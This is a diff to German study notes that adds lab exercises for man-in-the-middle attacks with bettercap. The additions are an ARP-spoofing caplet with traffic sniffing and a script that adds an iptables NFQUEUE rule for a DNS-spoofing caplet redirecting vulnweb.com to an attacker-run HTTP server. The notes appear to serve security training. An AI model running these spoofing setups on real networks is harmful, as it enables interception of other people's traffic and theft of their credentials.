@@ -79,6 +79,31 @@ Beobachtung:
 - Login-Versuche waren sichtbar
 - Klartext-Passwörter bei unverschlüsseltem HTTP Traffic
 
+## Übung (bettercap Custom Spoofing Script)
+```
+# Netzwerk scannen
+net.probe on
+sleep 5
+
+# Victim setzen
+set arp.spoof.targets <Victim IP>
+
+# Router und Victim gleichzeitig täuschener 
+set arp.spoof.fullduplex true
+
+# Traffic mitschneiden
+net.sniff on
+
+# ARP Spoofing starten
+arp.spoof on
+```
+
+Um auszuführen:
+
+```
+sudo bettercap -caplet arp_spoof.cap
+```
+
 # DNS Spoofing
 
 ## Übung (bettercap http Server)
@@ -117,7 +142,53 @@ in Bettercap vor allen anderen DNS befehle:
 ```
 set nfqueue.queue 1
 ```
+## Übung (bettercap caplet)
 
+Shell Script:
+```
+#!/bin/bash
+
+iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1
+
+
+bettercap -caplet dns_spoof.cap
+```
+
+um auszuführen:
+```
+chmod u+x dns_spoofing.sh
+./dns_spoofing.sh
+```
+
+Bettercap Caplet:
+```
+net.probe on
+sleep 5
+
+set arp.spoof.targets <Victim IP>
+
+set arp.spoof.fullduplex true
+
+set nfqueue.queue 1
+
+set dns.spoof.domains vulnweb.com
+set dns.spoof.address <Atacker IP>
+
+set http.server.path ./www
+set http.server.address 0.0.0.0
+set http.server.port 80
+
+net.sniff on
+
+http.server on
+
+arp.spoof on
+dns.spoof on
+```
+um auszuführen:
+```
+bettercap -caplet dns_spoof.cap
+```
 
 
 
